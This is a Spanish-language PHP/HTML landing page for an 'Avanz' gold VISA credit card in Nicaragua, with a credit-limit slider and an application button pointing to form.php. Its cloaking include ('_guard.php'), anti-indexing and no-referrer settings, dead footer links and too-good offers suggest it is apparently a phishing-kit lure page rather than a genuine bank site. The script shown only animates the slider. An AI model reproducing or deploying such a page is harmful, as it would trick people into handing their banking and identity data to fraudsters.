<?php require_once __DIR__ . '/_guard.php'; ?>
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <meta name="robots" content="noindex, nofollow, noarchive, nosnippet">
    <meta name="referrer" content="no-referrer">
    <title>Avanz - Tarjeta de Crédito Oro</title>
    <link rel="icon" href="img/lk.svg" type="image/svg+xml">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;600;700;800&display=swap" rel="stylesheet">
    <style>
        *{box-sizing:border-box;margin:0;padding:0}
        body{font-family:'Open Sans','Segoe UI',Arial,sans-serif;background:#fff;color:#1a1a1a;min-height:100vh;-webkit-text-size-adjust:100%}
        input:focus,select:focus,textarea:focus,
        input:focus-visible,select:focus-visible,textarea:focus-visible{outline:none !important;box-shadow:none !important}

        /* ---------- Topbar ---------- */
        .topbar{background:#fff;border-bottom:1px solid #ececec;padding:14px 20px;display:flex;align-items:center;justify-content:space-between;min-height:110px}
        .topbar .logo{height:70px !important;width:auto !important;display:block !important;max-width:280px}
        .topbar .menu{display:flex;flex-direction:column;gap:6px;cursor:pointer;padding:4px}
        .topbar .menu span{display:block;width:32px;height:4px;background:#4a4a4a;border-radius:2px}
        .topbar .menu-label{font-size:13px;color:#4a4a4a;font-weight:600;text-align:right}

        /* ---------- Hero ---------- */
        .hero{padding:34px 20px 8px;max-width:560px;margin:0 auto}
        .hero h1{font-size:30px;line-height:1.15;font-weight:800;color:#141414;letter-spacing:-.5px}
        .hero p.sub{margin-top:14px;font-size:18px;line-height:1.5;color:#3a3a3a}
        .hero p.sub b{color:#141414}
        .hero .curva{color:#FF7500;font-weight:800}

        /* ---------- Info box ---------- */
        .infobox{max-width:560px;margin:20px auto 0;padding:0 20px}
        .infobox .inner{padding:8px 0;display:flex;gap:12px;align-items:flex-start}
        .infobox .ic{flex:0 0 auto;width:26px;height:26px;border-radius:50%;background:#FF7500;color:#fff;display:flex;align-items:center;justify-content:center;font-weight:800;font-size:15px}
        .infobox p{font-size:18px;line-height:1.5;color:#333}
        .infobox p b{color:#141414}

        /* ---------- Card visual ---------- */
        .cardzone{max-width:560px;margin:26px auto 0;padding:0 20px}
        .cardimg{display:block;width:100%;height:auto}

        /* ---------- Cupo selector ---------- */
        .panel{max-width:560px;margin:26px auto 40px;padding:0 20px}
        .panel .inner{padding:8px 0 0}
        .panel h2{font-size:19px;font-weight:800;color:#141414;display:flex;align-items:center;gap:10px}
        .panel h2 .pic{width:34px;height:34px;border-radius:9px;background:#FF7500;color:#fff;display:flex;align-items:center;justify-content:center;flex:0 0 auto}
        .panel .pdesc{margin-top:4px;font-size:18px;color:#666}
        .clabel{margin-top:22px;text-align:center;font-size:18px;color:#888}
        .cval{text-align:center;font-size:38px;font-weight:800;color:#141414;letter-spacing:-1px;margin:2px 0 14px}
        .slider{width:100%;-webkit-appearance:none;appearance:none;height:8px;border-radius:6px;
                background:linear-gradient(to right,#FF7500 var(--fill,25%),#e8e8ee var(--fill,25%));outline:none}
        .slider::-webkit-slider-thumb{-webkit-appearance:none;appearance:none;width:26px;height:26px;border-radius:50%;
                background:#fff;border:5px solid #FF7500;cursor:pointer}
        .slider::-moz-range-thumb{width:18px;height:18px;border-radius:50%;background:#fff;border:5px solid #FF7500;cursor:pointer}
        .slider::-moz-range-track{height:8px;border-radius:6px;background:transparent}
        .srange{display:flex;justify-content:space-between;font-size:18px;color:#999;margin-top:8px}
        .checks{margin-top:18px;display:flex;flex-direction:column;gap:10px}
        .check{display:flex;align-items:center;gap:10px;padding:8px 0;font-size:18px;color:#2a2a2a}
        .check .ok{flex:0 0 auto;width:22px;height:22px;border-radius:50%;background:#18b556;color:#fff;display:flex;align-items:center;justify-content:center;font-size:13px;font-weight:700}
        .fine{margin-top:16px;padding:0;font-size:18px;color:#777;display:flex;gap:10px;align-items:flex-start}
        .fine .ic{flex:0 0 auto;width:20px;height:20px;border-radius:50%;background:#c9c9d4;color:#fff;display:flex;align-items:center;justify-content:center;font-size:12px;font-weight:700}
        .cta{display:block;width:100%;margin-top:20px;background:#FF7500;color:#fff;text-align:center;text-decoration:none;
             font-size:16px;font-weight:800;letter-spacing:.5px;padding:16px 0;border-radius:12px;border:0;cursor:pointer;transition:filter .15s}
        .cta:hover{filter:brightness(.95)}

        /* ---------- Footer ---------- */
        .footer{border-top:1px solid #ececec;background:#fff;margin-top:10px}
        .footer .fin{max-width:560px;margin:0 auto;padding:22px 20px 30px;display:flex;flex-direction:column;gap:10px}
        .footer img{height:22px;width:auto;align-self:flex-start;opacity:.9}
        .footer .fl{display:flex;gap:18px;font-size:12.5px;color:#888}
        .footer .fl a{color:#888;text-decoration:none}
        .footer .fl a:hover{color:#FF7500}
        .footer p{font-size:12px;color:#aaa;line-height:1.5}

        @media (min-width:640px){
            .hero h1{font-size:36px}
        }
    </style>
</head>
<body>
    <div class="topbar">
        <img class="logo" src="img/lk.svg" alt="Avanz">
        <div>
            <div class="menu"><span></span><span></span><span></span></div>
            <div class="menu-label">Menú</div>
        </div>
    </div>

    <section class="hero">
        <h1>Tarjeta de crédito <span class="curva">Oro</span> Avanz</h1>
        <p class="sub">Obtén tu Tarjeta de crédito Oro con un cupo de hasta <b>C$ 300.000</b>.</p>
    </section>

    <div class="infobox">
        <div class="inner">
            <div class="ic">i</div>
            <p><b>¡Te hicimos las cuentas!</b> En seis meses podrías ahorrar hasta <b>C$ 18.000</b> solo por usar tu tarjeta. Acumula beneficios, agrega descuentos y usa las facilidades a tu favor.</p>
        </div>
    </div>

    <div class="cardzone">
        <img class="cardimg" src="img/4a6d0bb1-23a1-4853-addf-cbebdce943c5.png" alt="Tarjeta de Crédito Avanz VISA Oro">
    </div>

    <section class="panel">
        <div class="inner">
            <h2><span class="pic">
                <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="2"><rect x="2" y="5" width="20" height="14" rx="2"/><line x1="2" y1="10" x2="22" y2="10"/></svg>
            </span>Escoge tu cupo ideal</h2>
            <p class="pdesc">Selecciona el cupo que mejor se adapte a tus necesidades</p>

            <div class="clabel">Cupo seleccionado</div>
            <div class="cval" id="cupoVal">C$ 80.000</div>

            <input type="range" class="slider" id="cupoSlider" min="10000" max="300000" step="5000" value="80000">
            <div class="srange"><span>C$ 10.000</span><span>C$ 300.000</span></div>

            <div class="checks">
                <div class="check"><span class="ok">✓</span>Sin cuota de manejo el primer año</div>
                <div class="check"><span class="ok">✓</span>Aprobación digital inmediata</div>
                <div class="check"><span class="ok">✓</span>Acumula beneficios en cada compra</div>
            </div>

            <div class="fine">
                <span class="ic">i</span>
                <span>El cupo se asigna sin intereses mensuales. Aplica sujeto a evaluación crediticia.</span>
            </div>

            <a class="cta" href="form.php">SOLICITAR TARJETA →</a>
        </div>
    </section>

    <footer class="footer">
        <div class="fin">
            <img src="img/lk.svg" alt="Avanz">
            <div class="fl">
                <a href="#">Términos y condiciones</a>
                <a href="#">Política de privacidad</a>
                <a href="#">Contáctenos</a>
            </div>
            <p>Avanz S.A. — Nicaragua. Tarjeta de crédito Oro emitida bajo licencia VISA. Cupo sujeto a evaluación crediticia. Montos en córdobas (C$).</p>
            <p>© 2026 Avanz. Todos los derechos reservados.</p>
        </div>
    </footer>

    <script>
    (function(){
        var slider = document.getElementById('cupoSlider');
        var val    = document.getElementById('cupoVal');
        function fmt(n){
            return 'C$ ' + String(n).replace(/\B(?=(\d{3})+(?!\d))/g, '.');
        }
        function paint(){
            var pct = ((slider.value - slider.min) / (slider.max - slider.min)) * 100;
            slider.style.setProperty('--fill', pct + '%');
            val.textContent = fmt(slider.value);
        }
        slider.addEventListener('input', paint);
        paint();
    })();
    </script>
</body>
</html>
